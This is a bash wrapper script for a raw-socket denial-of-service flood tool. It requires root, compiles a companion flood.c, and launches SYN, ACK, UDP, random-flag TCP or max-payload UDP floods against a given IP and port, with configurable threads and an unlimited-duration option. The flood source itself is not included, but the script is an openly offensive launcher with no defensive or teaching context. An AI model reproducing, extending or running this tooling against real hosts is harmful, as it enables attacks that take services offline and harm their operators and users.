#!/bin/bash
# made by dupewon

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
BIN="$SCRIPT_DIR/flood"
SRC="$SCRIPT_DIR/flood.c"


RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo ""
echo -e "${CYAN}  ╔══════════════════════════════════════════════╗${NC}"
echo -e "${CYAN}  ║          RAW SOCKET FLOOD TOOL               ║${NC}"
echo -e "${CYAN}  ║    syn | ack | udp | rawtcp | rawudp         ║${NC}"
echo -e "${CYAN}  ╚══════════════════════════════════════════════╝${NC}"
echo ""

if [ "$#" -lt 3 ]; then
    echo -e "  ${YELLOW}usage:${NC} $0 <ip> <port> <method> [threads] [duration]"
    echo ""
    echo -e "  ${GREEN}methods:${NC}"
    echo "    syn     — SYN flood"
    echo "    ack     — ACK flood"
    echo "    udp     — UDP flood (random payload)"
    echo "    rawtcp  — raw TCP random flags"
    echo "    rawudp  — raw UDP max payload"
    echo ""
    echo -e "  ${GREEN}example:${NC}"
    echo "    $0 1.2.3.4 80 syn 100 60"
    echo "    $0 1.2.3.4 53 udp 200 0     (infinite, ctrl+c to stop)"
    echo ""
    exit 1
fi

IP="$1"
PORT="$2"
METHOD="$3"
THREADS="${4:-100}"
DURATION="${5:-30}"


if [ "$(id -u)" -ne 0 ]; then
    echo -e "  ${RED}[!] raw sockets require root. run with sudo.${NC}"
    echo ""
    exit 1
fi


if [ ! -f "$BIN" ] || [ "$SRC" -nt "$BIN" ]; then
    echo -e "  ${YELLOW}[*] compiling flood.c ...${NC}"
    gcc -O2 -pthread -o "$BIN" "$SRC" 2>&1
    if [ $? -ne 0 ]; then
        echo -e "  ${RED}[!] compilation failed${NC}"
        exit 1
    fi
    echo -e "  ${GREEN}[+] compiled successfully${NC}"
    echo ""
fi


exec "$BIN" "$IP" "$PORT" "$METHOD" "$THREADS" "$DURATION"
